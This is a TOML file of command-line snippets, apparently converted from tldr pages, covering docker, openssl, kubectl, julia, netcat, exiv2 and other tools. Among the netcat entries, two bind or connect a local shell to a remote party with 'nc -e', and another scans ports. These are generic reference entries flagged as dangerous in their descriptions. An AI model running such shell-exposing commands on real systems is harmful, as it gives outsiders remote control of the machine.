  description = "Convert a PBM image to a MDA file"
  command = "pbmtomda <path/to/image.pbm> > <path/to/output.mda>"
  output = ""

[[snippets]]
  description = "Invert the colors in the input image"
  command = "pbmtomda -i <path/to/image.pbm> > <path/to/output.mda>"
  output = ""

[[snippets]]
  description = "Halve the input image's height"
  command = "pbmtomda -d <path/to/image.pbm> > <path/to/output.mda>"
  output = ""

[[snippets]]
  description = "Display `stdout` and `stderr` of the specified command if and only if it produces a non-zero exit code or crashes"
  command = "chronic <command options ...>"
  output = ""

[[snippets]]
  description = "Display `stdout` and `stderr` of the specified command if and only if it produces a non-empty `stderr`"
  command = "chronic -e <command options ...>"
  output = ""

[[snippets]]
  description = "Enable [v]erbose mode"
  command = "chronic -v <command options ...>"
  output = ""

[[snippets]]
  description = "List currently running Docker containers"
  command = "docker container ls"
  output = ""

[[snippets]]
  description = "Start one or more stopped containers"
  command = "docker container start <container1_name> <container2_name>"
  output = ""

[[snippets]]
  description = "Kill one or more running containers"
  command = "docker container kill <container_name>"
  output = ""

[[snippets]]
  description = "Stop one or more running containers"
  command = "docker container stop <container_name>"
  output = ""

[[snippets]]
  description = "Pause all processes within one or more containers"
  command = "docker container pause <container_name>"
  output = ""

[[snippets]]
  description = "Display detailed information on one or more containers"
  command = "docker container inspect <container_name>"
  output = ""

[[snippets]]
  description = "Export a container's filesystem as a `tar` archive"
  command = "docker container export <container_name>"
  output = ""

[[snippets]]
  description = "Create a new image from a container's changes"
  command = "docker container commit <container_name>"
  output = ""

[[snippets]]
  description = "Setup using `npm` 6.x"
  command = "npm create vite@latest my-react-app --template react-ts"
  output = ""

[[snippets]]
  description = "Setup using `npm` 7+, extra double-dash is needed"
  command = "npm create vite@latest my-react-app -- --template react-ts"
  output = ""

[[snippets]]
  description = "Setup using `yarn`"
  command = "yarn create vite my-react-app --template react-ts"
  output = ""

[[snippets]]
  description = "Setup using `pnpm`"
  command = "pnpm create vite my-react-app --template react-ts"
  output = ""

[[snippets]]
  description = "Format C/C++ source according to the Linux style guide, automatically back up the original files, and replace with the indented versions"
  command = "indent --linux-style <path/to/source.c> <path/to/another_source.c>"
  output = ""

[[snippets]]
  description = "Format C/C++ source according to the GNU style, saving the indented version to a different file"
  command = "indent --gnu-style <path/to/source.c> -o <path/to/indented_source.c>"
  output = ""

[[snippets]]
  description = "Format C/C++ source according to the style of Kernighan & Ritchie (K&R), no tabs, 3 spaces per indent, and wrap lines at 120 characters"
  command = "indent --k-and-r-style --indent-level3 --no-tabs --line-length120 <path/to/source.c> -o <path/to/indented_source.c>"
  output = ""

[[snippets]]
  description = "Compare files"
  command = "colordiff <file1> <file2>"
  output = ""

[[snippets]]
  description = "Output in two columns"
  command = "colordiff -y <file1> <file2>"
  output = ""

[[snippets]]
  description = "Ignore case differences in file contents"
  command = "colordiff -i <file1> <file2>"
  output = ""

[[snippets]]
  description = "Report when two files are the same"
  command = "colordiff -s <file1> <file2>"
  output = ""

[[snippets]]
  description = "Ignore whitespace"
  command = "colordiff -w <file1> <file2>"
  output = ""

[[snippets]]
  description = "Display certificate information"
  command = "openssl x509 -in <filename.crt> -noout -text"
  output = ""

[[snippets]]
  description = "Display a certificate's expiration date"
  command = "openssl x509 -enddate -noout -in <filename.pem>"
  output = ""

[[snippets]]
  description = "Convert a certificate between binary DER encoding and textual PEM encoding"
  command = "openssl x509 -inform <der> -outform <pem> -in <original_certificate_file> -out <converted_certificate_file>"
  output = ""

[[snippets]]
  description = "Store a certificate's public key in a file"
  command = "openssl x509 -in <certificate_file> -noout -pubkey -out <output_file>"
  output = ""

[[snippets]]
  description = "Print statistics about a Bitcode file"
  command = "llvm-bcanalyzer <path/to/file.bc>"
  output = ""

[[snippets]]
  description = "Print an SGML representation and statistics about a Bitcode file"
  command = "llvm-bcanalyzer -dump <path/to/file.bc>"
  output = ""

[[snippets]]
  description = "Read a Bitcode file from `stdin` and analyze it"
  command = "cat <path/to/file.bc> | llvm-bcanalyzer"
  output = ""

[[snippets]]
  description = "Start a rolling restart of a resource"
  command = "kubectl rollout restart <resource_type>/<resource_name>"
  output = ""

[[snippets]]
  description = "Watch the rolling update status of a resource"
  command = "kubectl rollout status <resource_type>/<resource_name>"
  output = ""

[[snippets]]
  description = "Roll back a resource to the previous revision"
  command = "kubectl rollout undo <resource_type>/<resource_name>"
  output = ""

[[snippets]]
  description = "View the rollout history of a resource"
  command = "kubectl rollout history <resource_type>/<resource_name>"
  output = ""

[[snippets]]
  description = "Format Go source files in the current directory"
  command = "go fmt"
  output = ""

[[snippets]]
  description = "Format a specific Go package in your import path (`$GOPATH/src`)"
  command = "go fmt <path/to/package>"
  output = ""

[[snippets]]
  description = "Format the package in the current directory and all subdirectories (note the `...`)"
  command = "go fmt <./...>"
  output = ""

[[snippets]]
  description = "Print what format commands would've been run, without modifying anything"
  command = "go fmt -n"
  output = ""

[[snippets]]
  description = "Print which format commands are run as they are run"
  command = "go fmt -x"
  output = ""

[[snippets]]
  description = "Execute commands from `stdin` in 5 minutes (press `Ctrl + D` when done)"
  command = "at now + 5 minutes"
  output = ""

[[snippets]]
  description = "Execute a command from `stdin` at 10:00 AM today"
  command = "echo ""<./make_db_backup.sh>"" | at 1000"
  output = ""

[[snippets]]
  description = "Execute commands from a given file next Tuesday"
  command = "at -f <path/to/file> 9:30 PM Tue"
  output = ""

[[snippets]]
  description = "Merge 2 PDFs into a single PDF"
  command = "pdfunite <path/to/fileA.pdf> <path/to/fileB.pdf> <path/to/merged_output.pdf>"
  output = ""

[[snippets]]
  description = "Merge a directory of PDFs into a single PDF"
  command = "pdfunite <path/to/directory/*.pdf> <path/to/merged_output.pdf>"
  output = ""

[[snippets]]
  description = "List service codes of a specific region"
  command = "aws pricing describe-services --region <us-east-1>"
  output = ""

[[snippets]]
  description = "List attributes for a given service code in a specific region"
  command = "aws pricing describe-services --service-code <AmazonEC2> --region <us-east-1>"
  output = ""

[[snippets]]
  description = "Print pricing information for a service code in a specific region"
  command = "aws pricing get-products --service-code <AmazonEC2> --region <us-east-1>"
  output = ""

[[snippets]]
  description = "List values for a specific attribute for a service code in a specific region"
  command = "aws pricing get-attribute-values --service-code <AmazonEC2> --attribute-name <instanceType> --region <us-east-1>"
  output = ""

[[snippets]]
  description = "Print pricing information for a service code using filters for instance type and location"
  command = "aws pricing get-products --service-code <AmazonEC2> --filters ""<Type=TERM_MATCH,Field=instanceType,Value=m5.xlarge>"" ""<Type=TERM_MATCH,Field=location,Value=US East (N. Virginia)>"" --region <us-east-1>"
  output = ""

[[snippets]]
  description = "Create a database owned by the current user"
  command = "createdb <database_name>"
  output = ""

[[snippets]]
  description = "Create a database owned by a specific user with a description"
  command = "createdb --owner=<username> <database_name> '<description>'"
  output = ""

[[snippets]]
  description = "Create a database from a template"
  command = "createdb --template=<template_name> <database_name>"
  output = ""

[[snippets]]
  description = "Display logs in real time"
  command = "varnishlog"
  output = ""

[[snippets]]
  description = "Only display requests to a specific domain"
  command = "varnishlog -q 'ReqHeader eq ""Host: <example.com>""'"
  output = ""

[[snippets]]
  description = "Only display POST requests"
  command = "varnishlog -q 'ReqMethod eq ""<POST>""'"
  output = ""

[[snippets]]
  description = "Only display requests to a specific path"
  command = "varnishlog -q 'ReqURL eq ""</path>""'"
  output = ""

[[snippets]]
  description = "Only display requests to paths matching a regular expression"
  command = "varnishlog -q 'ReqURL ~ ""<regex>""'"
  output = ""

[[snippets]]
  description = "Find and compile all modules in the current directory"
  command = "ghc Main"
  output = ""

[[snippets]]
  description = "Compile a single file"
  command = "ghc <path/to/file.hs>"
  output = ""

[[snippets]]
  description = "Compile using extra optimization"
  command = "ghc -O <path/to/file.hs>"
  output = ""

[[snippets]]
  description = "Stop compilation after generating object files (.o)"
  command = "ghc -c <path/to/file.hs>"
  output = ""

[[snippets]]
  description = "Start a REPL (interactive shell)"
  command = "ghci"
  output = ""

[[snippets]]
  description = "Evaluate a single expression"
  command = "ghc -e <expression>"
  output = ""

[[snippets]]
  description = "Debug the PlatformIO project in the current directory"
  command = "pio debug"
  output = ""

[[snippets]]
  description = "Debug a specific PlatformIO project"
  command = "pio debug --project-dir <path/to/platformio_project>"
  output = ""

[[snippets]]
  description = "Debug a specific environment"
  command = "pio debug --environment <environment>"
  output = ""

[[snippets]]
  description = "Debug a PlatformIO project using a specific configuration file"
  command = "pio debug --project-conf <path/to/platformio.ini>"
  output = ""

[[snippets]]
  description = "Debug a PlatformIO project using the `gdb` debugger"
  command = "pio debug --interface=<gdb> <gdb_options>"
  output = ""

[[snippets]]
  description = "Output the source address of ICMP TTL expire messages in `warts` files one after the other"
  command = "sc_ttlexp <path/to/file1.warts path/to/file2.warts ...>"
  output = ""

[[snippets]]
  description = "Start a REPL (interactive shell)"
  command = "julia"
  output = ""

[[snippets]]
  description = "Execute a Julia program and exit"
  command = "julia <program.jl>"
  output = ""

[[snippets]]
  description = "Execute a Julia program that takes arguments"
  command = "julia <program.jl> <arguments>"
  output = ""

[[snippets]]
  description = "Evaluate a string containing Julia code"
  command = "julia -e '<julia_code>'"
  output = ""

[[snippets]]
  description = "Evaluate a string of Julia code, passing arguments to it"
  command = "julia -e '<for x in ARGS; println(x); end>' <arguments>"
  output = ""

[[snippets]]
  description = "Evaluate an expression and print the result"
  command = "julia -E '<(1 - cos(pi/4))/2>'"
  output = ""

[[snippets]]
  description = "Start Julia in parallel mode, using N worker processes"
  command = "julia -p <N>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr docker rm"
  output = ""

[[snippets]]
  description = "Wrap each line to default width (80 characters)"
  command = "fold <path/to/file>"
  output = ""

[[snippets]]
  description = "Wrap each line to width "30""
  command = "fold -w30 <path/to/file>"
  output = ""

[[snippets]]
  description = "Wrap each line to width "5" and break the line at spaces (puts each space separated word in a new line, words with length > 5 are wrapped)"
  command = "fold -w5 -s <path/to/file>"
  output = ""

[[snippets]]
  description = "Generate an analyzer from a Lex file, storing it to the file `lex.yy.c`"
  command = "lex <analyzer.l>"
  output = ""

[[snippets]]
  description = "Specify the output file"
  command = "lex -t <analyzer.l> > <analyzer.c>"
  output = ""

[[snippets]]
  description = "Compile a C file generated by Lex"
  command = "c99 <path/to/lex.yy.c> -o <executable>"
  output = ""

[[snippets]]
  description = "Start ORCA with an empty workspace"
  command = "orca-c"
  output = ""

[[snippets]]
  description = "Start ORCA and open a specific file"
  command = "orca-c <path/to/file.orca>"
  output = ""

[[snippets]]
  description = "Start ORCA and set a specific tempo (defaults to 120)"
  command = "orca-c --bpm <beats_per_minute>"
  output = ""

[[snippets]]
  description = "Start ORCA and set the size of the grid"
  command = "orca-c --initial-size <columns>x<rows>"
  output = ""

[[snippets]]
  description = "Start ORCA and set the maximum number of undo steps (defaults to 100)"
  command = "orca-c --undo-limit <limit>"
  output = ""

[[snippets]]
  description = "Show the main menu inside of ORCA"
  command = "F1"
  output = ""

[[snippets]]
  description = "Show all shortcuts inside of ORCA"
  command = "?"
  output = ""

[[snippets]]
  description = "Show all ORCA operators inside of ORCA"
  command = "<Ctrl> + g"
  output = ""

[[snippets]]
  description = "Start a listener on the specified TCP port and send a file into it"
  command = "nc -l -p <port> < <filename>"
  output = ""

[[snippets]]
  description = "Connect to a target listener on the specified port and receive a file from it"
  command = "nc <host> <port> > <received_filename>"
  output = ""

[[snippets]]
  description = "Scan the open TCP ports of a specified host"
  command = "nc -v -z -w <timeout_in_seconds> <host> <start_port>-<end_port>"
  output = ""

[[snippets]]
  description = "Start a listener on the specified TCP port and provide your local shell access to the connected party (this is dangerous and can be abused)"
  command = "nc -l -p <port> -e <shell_executable>"
  output = ""

[[snippets]]
  description = "Connect to a target listener and provide your local shell access to the remote party (this is dangerous and can be abused)"
  command = "nc <host> <port> -e <shell_executable>"
  output = ""

[[snippets]]
  description = "Act as a proxy and forward data from a local TCP port to the given remote host"
  command = "nc -l -p <local_port> | nc <host> <remote_port>"
  output = ""

[[snippets]]
  description = "Send an HTTP GET request"
  command = "echo -e ""GET / HTTP/1.1\nHost: <host>\n\n"" | nc <host> 80"
  output = ""

[[snippets]]
  description = "Interactively create a merge request"
  command = "glab mr create"
  output = ""

[[snippets]]
  description = "Create a merge request, determining the title and description from the commit messages of the current branch"
  command = "glab mr create --fill"
  output = ""

[[snippets]]
  description = "Create a draft merge request"
  command = "glab mr create --draft"
  output = ""

[[snippets]]
  description = "Create a merge request specifying the target branch, title, and description"
  command = "glab mr create --target-branch <target_branch> --title ""<title>"" --description ""<description>"""
  output = ""

[[snippets]]
  description = "Start opening a merge request in the default web browser"
  command = "glab mr create --web"
  output = ""

[[snippets]]
  description = "Configure the snippet manager, e.g. to set the security token from QOwnNotes"
  command = "qc configure"
  output = ""

[[snippets]]
  description = "Search and print command snippets stored in your `Commands.md` note and all your notes tagged with `commands`"
  command = "qc search"
  output = ""

[[snippets]]
  description = "Execute a snippet and show the command before executing"
  command = "qc exec --command"
  output = ""

[[snippets]]
  description = "Execute the last snippet and show the command before executing"
  command = "qc exec --command --last"
  output = ""

[[snippets]]
  description = "Switch between note folders in QOwnNotes"
  command = "qc switch"
  output = ""

[[snippets]]
  description = "Unlock the current wallet (timeout in seconds)"
  command = "hsw-cli unlock <passphrase> <timeout>"
  output = ""

[[snippets]]
  description = "Lock the current wallet"
  command = "hsw-cli lock"
  output = ""

[[snippets]]
  description = "View the current wallet's details"
  command = "hsw-cli get"
  output = ""

[[snippets]]
  description = "View the current wallet's balance"
  command = "hsw-cli balance"
  output = ""

[[snippets]]
  description = "View the current wallet's transaction history"
  command = "hsw-cli history"
  output = ""

[[snippets]]
  description = "Send a transaction with the specified coin amount to an address"
  command = "hsw-cli send <address> <1.05>"
  output = ""

[[snippets]]
  description = "View the current wallet's pending transactions"
  command = "hsw-cli pending"
  output = ""

[[snippets]]
  description = "View details about a transaction"
  command = "hsw-cli tx <transaction_hash>"
  output = ""

[[snippets]]
  description = "View documentation for the original command"
  command = "tldr xz"
  output = ""

[[snippets]]
  description = "Create and switch to a new feature branch"
  command = "git feature <feature_branch>"
  output = ""

[[snippets]]
  description = "Merge a feature branch into the current branch creating a merge commit"
  command = "git feature finish <feature_branch>"
  output = ""

[[snippets]]
  description = "Merge a feature branch into the current branch squashing the changes into one commit"
  command = "git feature finish --squash <feature_branch>"
  output = ""

[[snippets]]
  description = "Send changes from a specific feature branch to its remote counterpart"
  command = "git feature <feature_branch> --remote <remote_name>"
  output = ""

[[snippets]]
  description = "Generate an image using only `n_colors` or less colors as close as possible to the input image"
  command = "pnmquant <n_colors> <path/to/input.pnm> > <path/to/output.pnm>"
  output = ""

[[snippets]]
  description = "Create a GeoPackage with a layer for each input Shapefile"
  command = "ogrmerge.py -f <GPKG> -o <path/to/output.gpkg> <path/to/input1.shp path/to/input2.shp ...>"
  output = ""

[[snippets]]
  description = "Create a virtual datasource (VRT) with a layer for each input GeoJSON"
  command = "ogrmerge.py -f <VRT> -o <path/to/output.vrt> <path/to/input1.geojson path/to/input2.geojson ...>"
  output = ""

[[snippets]]
  description = "Concatenate two vector datasets and store source name of dataset in attribute 'source_name'"
  command = "ogrmerge.py -single -f <GeoJSON> -o <path/to/output.geojson> -src_layer_field_name country <source_name> <path/to/input1.shp path/to/input2.shp ...>"
  output = ""

[[snippets]]
  description = "Create a model with 3 fields and a migration file"
  command = "sequelize model:generate --name <table_name> --attributes <field1:integer,field2:string,field3:boolean>"
  output = ""

[[snippets]]
  description = "Run the migration file"
  command = "sequelize db:migrate"
  output = ""

[[snippets]]
  description = "Revert all migrations"
  command = "sequelize db:migrate:undo:all"
  output = ""

[[snippets]]
  description = "Create a seed file with the specified name to populate the database"
  command = "sequelize seed:generate --name <seed_filename>"
  output = ""

[[snippets]]
  description = "Populate database using all seed files"
  command = "sequelize db:seed:all"
  output = ""

[[snippets]]
  description = "Display a diff of the changes that would be made, without making them (dry-run)"
  command = "yapf --diff <path/to/file>"
  output = ""

[[snippets]]
  description = "Format the file in-place and display a diff of the changes"
  command = "yapf --diff --in-place <path/to/file>"
  output = ""

[[snippets]]
  description = "Recursively format all Python files in a directory, concurrently"
  command = "yapf --recursive --in-place --style <pep8> --parallel <path/to/directory>"
  output = ""

[[snippets]]
  description = "List the aliases that can be used to launch an instance"
  command = "multipass find"
  output = ""

[[snippets]]
  description = "Launch a new instance, set its name and use a cloud-init configuration file"
  command = "multipass launch -n <instance_name> --cloud-init <configuration_file>"
  output = ""

[[snippets]]
  description = "List all the created instances and some of their properties"
  command = "multipass list"
  output = ""

[[snippets]]
  description = "Start a specific instance by name"
  command = "multipass start <instance_name>"
  output = ""

[[snippets]]
  description = "Show the properties of an instance"
  command = "multipass info <instance_name>"
  output = ""

[[snippets]]
  description = "Open a shell prompt on a specific instance by name"
  command = "multipass shell <instance_name>"
  output = ""

[[snippets]]
  description = "Delete an instance by name"
  command = "multipass delete <instance_name>"
  output = ""

[[snippets]]
  description = "Mount a directory into a specific instance"
  command = "multipass mount <path/to/local/directory> <instance_name>:<path/to/target/directory>"
  output = ""

[[snippets]]
  description = "Decode a JWT"
  command = "jwt decode <jwt_string>"
  output = ""

[[snippets]]
  description = "Decode a JWT as a JSON string"
  command = "jwt decode -j <jwt_string>"
  output = ""

[[snippets]]
  description = "Encode a JSON string to a JWT"
  command = "jwt encode --alg <HS256> --secret <1234567890> '<json_string>'"
  output = ""

[[snippets]]
  description = "Encode key pair payload to JWT"
  command = "jwt encode --alg <HS256> --secret <1234567890> -P <key=value>"
  output = ""

[[snippets]]
  description = "Run the calculator in interactive mode"
  command = "eva"
  output = ""

[[snippets]]
  description = "Calculate the result of an expression"
  command = "eva ""<(1 + 2) * 2 ^ 2>"""
  output = ""

[[snippets]]
  description = "Calculate an expression forcing the number of decimal places to 5"
  command = "eva --fix <5> ""<5 / 3>"""
  output = ""

[[snippets]]
  description = "Calculate an expression with sine and cosine"
  command = "eva ""<sin(1) + cos(1)>"""
  output = ""

[[snippets]]
  description = "Extract a file from an archive, replacing the original file if it exists"
  command = "gunzip <archive.tar.gz>"
  output = ""

[[snippets]]
  description = "Extract a file to a target destination"
  command = "gunzip --stdout <archive.tar.gz> > <archive.tar>"
  output = ""

[[snippets]]
  description = "Extract a file and keep the archive file"
  command = "gunzip --keep <archive.tar.gz>"
  output = ""

[[snippets]]
  description = "List the contents of a compressed file"
  command = "gunzip --list <file.txt.gz>"
  output = ""

[[snippets]]
  description = "Decompress an archive from `stdin`"
  command = "cat <path/to/archive.gz> | gunzip"
  output = ""

[[snippets]]
  description = "Display metadata for a given file in the console"
  command = "mediainfo <file>"
  output = ""

[[snippets]]
  description = "Store the output to a given file along with displaying in the console"
  command = "mediainfo --Logfile=<out.txt> <file>"
  output = ""

[[snippets]]
  description = "List metadata attributes that can be extracted"
  command = "mediainfo --Info-Parameters"
  output = ""

[[snippets]]
  description = "Reset all tracked files and delete all untracked files"
  command = "git clear-soft"
  output = ""

[[snippets]]
  description = "View account"
  command = "linode-cli account view"
  output = ""

[[snippets]]
  description = "View account settings"
  command = "linode-cli account settings"
  output = ""

[[snippets]]
  description = "Make a payment"
  command = "linode-cli account payment-create --cvv <cvv> --usd <amount_in_dollars>"
  output = ""

[[snippets]]
  description = "View account notifications"
  command = "linode-cli account notifications-list"
  output = ""

[[snippets]]
  description = "Print all branches which are not merged into the current HEAD"
  command = "git show-unmerged-branches"
  output = ""

[[snippets]]
  description = "Mount an MTP device to a directory"
  command = "jmtpfs <path/to/directory>"
  output = ""

[[snippets]]
  description = "Set mount options"
  command = "jmtpfs -o <allow_other,auto_unmount> <path/to/directory>"
  output = ""

[[snippets]]
  description = "List available MTP devices"
  command = "jmtpfs --listDevices"
  output = ""

[[snippets]]
  description = "If multiple devices are present, mount a specific device"
  command = "jmtpfs -device=<bus_id>,<device_id> <path/to/directory>"
  output = ""

[[snippets]]
  description = "Unmount MTP device"
  command = "fusermount -u <path/to/directory>"
  output = ""

[[snippets]]
  description = "Start a REPL (interactive shell)"
  command = "scala"
  output = ""

[[snippets]]
  description = "Start the interpreter with a dependency in the classpath"
  command = "scala -classpath <filename.jar> <command>"
  output = ""

[[snippets]]
  description = "Execute a Scala script"
  command = "scala <script.scala>"
  output = ""

[[snippets]]
  description = "Execute a `.jar` program"
  command = "scala <filename.jar>"
  output = ""

[[snippets]]
  description = "Execute a single Scala command in the command-line"
  command = "scala -e <command>"
  output = ""

[[snippets]]
  description = "Create a shell script that when executed extracts the given files from itself"
  command = "shar <path/to/file1 path/to/file2 ...> > <path/to/archive.sh>"
  output = ""

[[snippets]]
  description = "Make a backup of one or more packages"
  command = "tlmgr backup <package1 package2 ...>"
  output = ""

[[snippets]]
  description = "Make a backup of all packages"
  command = "tlmgr backup --all"
  output = ""

[[snippets]]
  description = "Make a backup to a custom directory"
  command = "tlmgr backup <package> --backupdir <path/to/backup_directory>"
  output = ""

[[snippets]]
  description = "Remove a backup of one or more packages"
  command = "tlmgr backup clean <package1 package2 ...>"
  output = ""

[[snippets]]
  description = "Remove all backups"
  command = "tlmgr backup clean --all"
  output = ""

[[snippets]]
  description = "Print a file with the author name and commit hash prepended to each line"
  command = "git annotate <path/to/file>"
  output = ""

[[snippets]]
  description = "Print a file with the author [e]mail and commit hash prepended to each line"
  command = "git annotate -e <path/to/file>"
  output = ""

[[snippets]]
  description = "Print only rows that match a regular expression"
  command = "git annotate -L :<regexp> <path/to/file>"
  output = ""

[[snippets]]
  description = "Register the Git hooks"
  command = "grumphp git:init"
  output = ""

[[snippets]]
  description = "Trigger the pre-commit hook manually"
  command = "grumphp git:pre-commit"
  output = ""

[[snippets]]
  description = "Check every versioned file"
  command = "grumphp run"
  output = ""

[[snippets]]
  description = "Start the daemon"
  command = "pppd"
  output = ""

[[snippets]]
  description = "Print all URLs found by a Google search"
  command = "xidel <https://www.google.com/search?q=test> --extract ""//a/extract(@href, 'url[?]q=([^&]+)&', 1)[. != '']"""
  output = ""

[[snippets]]
  description = "Print the title of all pages found by a Google search and download them"
  command = "xidel <https://www.google.com/search?q=test> --follow ""<//a/extract(@href, 'url[?]q=([^&]+)&', 1)[. != '']>"" --extract <//title> --download <'{$host}/'>"
  output = ""

[[snippets]]
  description = "Follow all links on a page and print the titles, with XPath"
  command = "xidel <https://example.org> --follow <//a> --extract <//title>"
  output = ""

[[snippets]]
  description = "Follow all links on a page and print the titles, with CSS selectors"
  command = "xidel <https://example.org> --follow ""<css('a')>"" --css <title>"
  output = ""

[[snippets]]
  description = "Follow all links on a page and print the titles, with pattern matching"
  command = "xidel <https://example.org> --follow ""<<a>{.}</a>*>"" --extract ""<<title>{.}</title>>"""
  output = ""

[[snippets]]
  description = "Read the pattern from example.xml (which will also check if the element containing "ood" is there, and fail otherwise)"
  command = "xidel <path/to/example.xml> --extract ""<<x><foo>ood</foo><bar>{.}</bar></x>>"""
  output = ""

[[snippets]]
  description = "Print all newest Stack Overflow questions with title and URL using pattern matching on their RSS feed"
  command = "xidel <http://stackoverflow.com/feeds> --extract ""<<entry><title>{title:=.}</title><link>{uri:=@href}</link></entry>+>"""
  output = ""

[[snippets]]
  description = "Check for unread Reddit mail, Webscraping, combining CSS, XPath, JSONiq, and automatically form evaluation"
  command = "xidel <https://reddit.com> --follow ""<form(css('form.login-form')[1], {'user': '$your_username', 'passwd': '$your_password'})>"" --extract ""<css('#mail')/@title>"""
  output = ""

[[snippets]]
  description = "Install some packages from nixpkgs into the default profile"
  command = "nix profile install <nixpkgs#pkg1 nixpkgs#pkg2 ...>"
  output = ""

[[snippets]]
  description = "Install a package from a flake on GitHub into a custom profile"
  command = "nix profile install <github:owner/repo/pkg> --profile <./path/to/directory>"
  output = ""

[[snippets]]
  description = "List packages currently installed in the default profile"
  command = "nix profile list"
  output = ""

[[snippets]]
  description = "Remove a package installed from nixpkgs from the default profile, by name"
  command = "nix profile remove <legacyPackages.x86_64-linux.pkg>"
  output = ""

[[snippets]]
  description = "Upgrade packages in the default to the latest available versions"
  command = "nix profile upgrade"
  output = ""

[[snippets]]
  description = "Rollback (cancel) the latest action on the default profile"
  command = "nix profile rollback"
  output = ""

[[snippets]]
  description = "Print a summary of the image Exif metadata"
  command = "exiv2 <path/to/file>"
  output = ""

[[snippets]]
  description = "Print all metadata (Exif, IPTC, XMP) with interpreted values"
  command = "exiv2 -P kt <path/to/file>"
  output = ""

[[snippets]]
  description = "Print all metadata with raw values"
  command = "exiv2 -P kv <path/to/file>"
  output = ""

[[snippets]]
  description = "Delete all metadata from an image"
  command = "exiv2 -d a <path/to/file>"
  output = ""

[[snippets]]
  description = "Delete all metadata, preserving the file timestamp"
  command = "exiv2 -d a -k <path/to/file>"
  output = ""

[[snippets]]
  description = "Rename the file, prepending the date and time from metadata (not from the file timestamp)"
  command = "exiv2 -r <'%Y%m%d_%H%M%S_:basename:'> <path/to/file>"
  output = ""

[[snippets]]
  description = "Convert tabs in each file to spaces, writing to `stdout`"
  command = "expand <path/to/file>"
  output = ""

[[snippets]]
  description = "Convert tabs to spaces, reading from `stdin`"
  command = "expand"
  output = ""

[[snippets]]
  description = "Do not convert tabs after non blanks"
  command = "expand -i <path/to/file>"
  output = ""

[[snippets]]
  description = "Have tabs a certain number of characters apart, not 8"
  command = "expand -t=<number> <path/to/file>"
  output = ""

[[snippets]]
  description = "Use a comma separated list of explicit tab positions"
  command = "expand -t=<1,4,6>"
  output = ""

[[snippets]]
  description = "Generate a random password (8 to 10 characters long, containing letters and numbers)"
  command = "makepasswd"
  output = ""

[[snippets]]
  description = "Generate a 10 characters long password"
  command = "makepasswd --chars <10>"
  output = ""

[[snippets]]
  description = "Generate a 5 to 10 characters long password"
  command = "makepasswd --minchars <5> --maxchars <10>"
  output = ""

[[snippets]]
  description = "Generate a password containing only the characters "b", "a" or "r""
  command = "makepasswd --string <bar>"
  output = ""

[[snippets]]
  description = "Show commits that haven't been pushed"
  command = "git local-commits"
  output = ""

[[snippets]]
  description = "Change the committer and author of a commit"
  command = "git blame-someone-else ""<author <someone@example.com>>"" <commit>"
  output = ""

[[snippets]]
  description = "Start an interactive shell session"
  command = "dash"
  output = ""

[[snippets]]
  description = "Execute specific [c]ommands"
  command = "dash -c ""<echo 'dash is executed'>"""
  output = ""

[[snippets]]
  description = "Execute a specific script"
  command = "dash <path/to/script.sh>"
  output = ""

[[snippets]]
  description = "Check a specific script for syntax errors"
  command = "dash -n <path/to/script.sh>"
  output = ""

[[snippets]]
  description = "Execute a specific script while printing each command before executing it"
  command = "dash -x <path/to/script.sh>"
  output = ""

[[snippets]]
  description = "Execute a specific script and stop at the first [e]rror"
  command = "dash -e <path/to/script.sh>"
  output = ""

[[snippets]]
  description = "Execute specific commands from `stdin`"
  command = "<echo ""echo 'dash is executed'""> | dash"
  output = ""

[[snippets]]
  description = "Display version information for all installed components, along with available updates to them"
  command = "gcloud version"
  output = ""

[[snippets]]
  description = "Display help"
  command = "gcloud version --help"
  output = ""

[[snippets]]
  description = "Install atuin into your shell"
  command = "eval ""$(atuin init <bash|zsh|fish>)"""
  output = ""

[[snippets]]
  description = "Import history from the shell default history file"
  command = "atuin import auto"
  output = ""

[[snippets]]
  description = "Search shell history for a specific command"
  command = "atuin search <command>"
  output = ""

[[snippets]]
  description = "Register an account on the default sync server using the specified [u]sername, [e]mail and [p]assword"
  command = "atuin register -u <username> -e <email> -p <password>"
  output = ""

[[snippets]]
  description = "Login to the default sync server"
  command = "atuin login -u <username> -p <password>"
  output = ""

[[snippets]]
  description = "Sync history with the sync server"
  command = "atuin sync"
  output = ""

[[snippets]]
  description = "Convert a PBM image to a compressed GraphOn graphic"
  command = "pbmtogo <path/to/image.pbm> > <path/to/output.go>"
  output = ""

[[snippets]]
  description = "Lint a Dockerfile"
  command = "hadolint <path/to/Dockerfile>"
  output = ""

[[snippets]]
  description = "Lint a Dockerfile, displaying the output in JSON format"
  command = "hadolint --format <json> <path/to/Dockerfile>"
  output = ""

[[snippets]]
  description = "Lint a Dockerfile, displaying the output in a specific format"
  command = "hadolint --format <tty|json|checkstyle|codeclimate|codacy> <path/to/Dockerfile>"
  output = ""

[[snippets]]
  description = "Lint a Dockerfile ignoring specific rules"
  command = "hadolint --ignore <DL3006> --ignore <DL3008> <path/to/Dockerfile>"
  output = ""

[[snippets]]
  description = "Lint multiple Dockerfiles using specific trusted registries"
  command = "hadolint --trusted-registry <docker.io> --trusted-registry <example.com>:<5000> <path/to/Dockerfile1 path/to/Dockerfile2 ...>"
  output = ""

[[snippets]]
  description = "Start `cupsd` in the background, aka. as a daemon"
  command = "cupsd"
  output = ""

[[snippets]]
  description = "Start `cupsd` on the [f]oreground"
  command = "cupsd -f"
  output = ""

[[snippets]]
  description = "[l]aunch `cupsd` on-demand (commonly used by `launchd` or `systemd`)"
  command = "cupsd -l"
  output = ""

[[snippets]]
  description = "Start `cupsd` using the specified [`c`]`upsd.conf` configuration file"
  command = "cupsd -c <path/to/cupsd.conf>"
  output = ""

[[snippets]]
  description = "Start `cupsd` using the specified `cups-file`[`s`]`.conf` configuration file"
  command = "cupsd -s <path/to/cups-files.conf>"
  output = ""

[[snippets]]
  description = "[t]est the [`c`]`upsd.conf` configuration file for errors"
  command = "cupsd -t -c <path/to/cupsd.conf>"
  output = ""

[[snippets]]
  description = "[t]est the `cups-file`[`s`]`.conf` configuration file for errors"
  command = "cupsd -t -s <path/to/cups-files.conf>"
  output = ""

[[snippets]]
  description = "Display help"
  command = "cupsd -h"
  output = ""

[[snippets]]
  description = "Retry a command until it succeeds"
  command = "retry <command>"
  output = ""

[[snippets]]
  description = "Retry a command every n seconds until it succeeds"
  command = "retry --delay=<n> <command>"
  output = ""

[[snippets]]
  description = "Give up after n attempts"
  command = "retry --times=<n> <command>"
  output = ""

[[snippets]]
  description = "List all available platforms in the package repository"
  command = "tlmgr platform list"
  output = ""

[[snippets]]
